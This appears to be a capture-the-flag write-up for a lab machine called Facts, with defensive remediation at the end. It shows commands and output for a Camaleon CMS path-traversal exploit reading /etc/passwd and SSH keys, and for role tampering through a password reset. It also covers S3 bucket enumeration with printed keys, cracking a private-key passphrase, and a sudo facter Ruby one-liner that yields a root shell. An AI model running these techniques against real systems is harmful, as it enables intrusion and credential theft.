
| Property       | Value                                                     |
| -------------- | --------------------------------------------------------- |
| **OS**         | Linux                                                     |
| **Difficulty** | Easy                                                      |
| **Release**    | 2026-01-31                                                |
| **State**      | Retired                                                   |
| **IP**         | 10.129.54.170                                             |
| **Techniques** | path traversal, S3 enumeration, hash cracking, sudo abuse |
| **Tags**       | #web #privesc #linux #cms #s3                             |

---
## Summary

Facts is an easy Linux machine hosting a Camaleon CMS instance vulnerable to an authenticated arbitrary file read (CVE-2024-46987). After registering an account to an exposed admin endpoint, the CVE can be leveraged to read local files. The site also allows to change the role parameter through a password reset request, granting full admin privileges over the application. 
An exposed S3-compatible service on port 54321 reveals a user's home directory bucket containing an encrypted SSH private key. The passphrase can be cracked with John the Ripper, granting SSH access as `trivia`. Privilege escalation is achieved through a `sudo` rule allowing `facter` to run as root with a custom directory, enabling arbitrary Ruby code execution as root.

---
## Enumeration

```
echo '10.129.54.170 facts.htb' | sudo tee -a /etc/hosts
```

Added the ip address of the machine to the /etc/hosts file.

### Nmap Scan

```
sudo nmap -sV -sC facts.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-02 13:15 EDT
Nmap scan report for facts.htb (10.129.54.170)
Host is up (0.028s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: facts
|_http-server-header: nginx/1.26.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 8.64 seconds

sudo nmap -p- facts.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-02 13:15 EDT
Nmap scan report for facts.htb (10.129.54.170)
Host is up (0.030s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
54321/tcp open  unknown
```

### Service Enumeration

```
nc -nv 10.129.54.170 54321
```

Port 54321 returns an open connection but no banner or command prompts. The website running on port 80 has the admin endpoint exposed.

**Admin endpoint exposed via directory fuzzing:**

```
ffuf -w /home/kali/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt:FUZZ -u http://facts.htb/FUZZ
search    [Status: 200, Size: 19187]
admin     [Status: 302, Size: 0]
ajax      [Status: 200, Size: 0]
page      [Status: 200, Size: 19593]
welcome   [Status: 200, Size: 11966]
post      [Status: 200, Size: 11308]
sitemap   [Status: 200, Size: 3508]
rss       [Status: 200, Size: 183]
up        [Status: 200, Size: 73]
```

The `/admin` endpoint redirects to a login form. Registering an account grants access to the admin panel.

![](screens/1.png)

**Vulnerable Camaleon CMS version 2.9.0:**

![](screens/2.png)

---
## Foothold

### CVE-2024-46987

CVE-2024-46987 allows an authenticated user to read arbitrary files from the server via a path traversal in the Camaleon CMS media upload functionality.

### Administrator role parameter

The password reset functionality can be abused to add a `role` parameter in the intercepted request. Setting the parameter to `admin` elevates the account to full administrator without authorization.

![](./screens/3.png)

![](./screens/4.png)

### Exploitation

```
python3 CVE-2024-46987.py -u http://facts.htb -l test -p test /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

Two users discovered: `trivia` and `william`.

```
python3 CVE-2024-46987.py -u http://facts.htb -l test -p test /home/trivia/.ssh/id_rsa
python3 CVE-2024-46987.py -u http://facts.htb -l test -p test /home/william/.ssh/id_rsa
```

Attempts to read their SSH private keys via the CVE returned no output.

### Exposed Credentials

![](./screens/5.png)

The unknown service running on port 54321 responds to AWS CLI as an S3-compatible endpoint.

```
aws configure
AWS Access Key ID:     AKIA4F54AEFE6C1A292E
AWS Secret Access Key: pk06ccTRyh+PJ4+/2NVpjTaV7mH8c2LJ0lQvc8O3
Default region:        us-east-1

aws s3 ls --endpoint-url http://facts.htb:54321
2025-09-11 08:06:52 internal
2025-09-11 08:06:52 randomfacts

aws s3 ls s3://internal/ --endpoint-url http://facts.htb:54321
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/
2026-01-08 13:45:13        220 .bash_logout
2026-01-08 13:45:13       3900 .bashrc
2026-01-08 13:47:17         20 .lesshst
2026-01-08 13:47:17        807 .profile
```

The `internal` bucket maps to a user's home directory.

```
aws s3 cp s3://internal/.ssh/ . --endpoint-url http://facts.htb:54321 --recursive
download: s3://internal/.ssh/authorized_keys to ./authorized_keys
download: s3://internal/.ssh/id_ed25519 to ./id_ed25519
```

Checking with the CVE file read confirms the key belongs to `trivia`.

```
python3 CVE-2024-46987.py -u http://facts.htb -l test -p test /home/trivia/.ssh/id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDV8LJjLM
tmxuUAM52uS3URAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIA0fh9DAAdkAdXBE
nTp5jc2RUjqNlea6g/9nBKHUSLW7AAAAoJeGejdbhoZLqh8JFWq8O4KRUKr0+Xw/iJO5Xe
OHFotOrVH+nMGeULSsK48xMzzHIeghF7GZWK4uqjoab0Y8PqbHSDNh85T26q0xcxuMgp7K
VzMi6hTpi715Xb589lgwcMxSIjsItmPkWxj0ulP4sIDQ5knExzO0BEBx73bVv4sq+Ph2JM
1exaqJimJ4TNd3avVelZ9KJ4RlLurD7EadRA4=
-----END OPENSSH PRIVATE KEY-----
```

The key is passphrase-protected.

```
ssh2john id_ed25519 > id_ed25519.hash
john id_ed25519.hash --wordlist=/usr/share/wordlists/rockyou.txt
dragonballz      (id_ed25519)
1g 0:00:05:44 DONE (2026-05-02 14:49)
```

---
## User Flag

```
chmod 600 id_ed25519
ssh trivia@facts.htb -i id_ed25519
# passphrase: dragonballz

trivia@facts:~$ ls /home/william
user.txt

trivia@facts:~$ file /home/william/user.txt
/home/william/user.txt: ASCII text
```

The user flag is located in `william`'s home directory, readable by `trivia`.

---
## Privilege Escalation

### Enumeration

```
trivia@facts:~$ sudo -l
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

`facter` accepts a `--custom-dir` flag that loads `.rb` files from a specified directory and executes them as Ruby. Running it as root with a custom directory allows arbitrary Ruby commands with root privileges.

![](./screens/6.png)
### Exploitation

```
trivia@facts:/tmp$ echo 'system("/bin/bash")' > root.rb
trivia@facts:/tmp$ sudo /usr/bin/facter --custom-dir=/tmp x
root@facts:/tmp# file /root/root.txt
/root/root.txt: ASCII text
```

---
## Remediation

- **CVE-2024-46987:** Upgrade Camaleon CMS to a patched version.
- **Unauthorized role change:** Enforce role assignment server-side on all user-modifiable requests.
- **S3 credential exposure:** Change the exposed AWS credentials. Don't hardcode credentials in application files.
- **S3 bucket permissions:** Restrict bucket ACLs so that internal buckets are not accessible without proper authentication.
- **sudo facter abuse:** Remove the `facter` sudo rule or restrict it.

---
## References

- [CVE-2024-46987 PoC](https://github.com/Goultarde/CVE-2024-46987)
- [GTFOBins - facter](https://gtfobins.github.io/gtfobins/facter/)